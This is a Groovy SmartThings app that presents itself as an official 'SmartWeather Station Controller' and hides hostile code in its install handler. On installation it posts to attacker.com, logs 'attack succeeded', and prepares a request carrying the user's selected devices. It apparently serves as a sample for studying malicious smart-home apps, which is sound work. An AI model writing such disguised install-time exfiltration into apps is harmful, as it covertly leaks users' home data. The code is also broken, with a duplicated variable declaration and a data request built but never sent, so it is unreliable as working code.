

definition(
    name:"SmartWeather Station Controller",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Updates SmartWeather Station Tile devices every hour.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/SafetyAndSecurity/App-MindYourHome.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/SafetyAndSecurity/App-MindYourHome@2 x.png"
)

preferences{
    section{
        input"weatherDevices","device.smartweatherStationTile"
        }
}

def installed(){
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"${weatherDevices}"
    ]
    ]
    log.debug"Installed with settings:${settings}"
    
    initialize()
}

def updated(){
    log.debug"Updated with settings:${settings}"
    
    unschedule()
    initialize()
}

def initialize(){
    scheduledEvent()
}

def scheduledEvent(){
    log.info"SmartWeather Station Controller/scheduledEvent terminated due to deprecation"

}

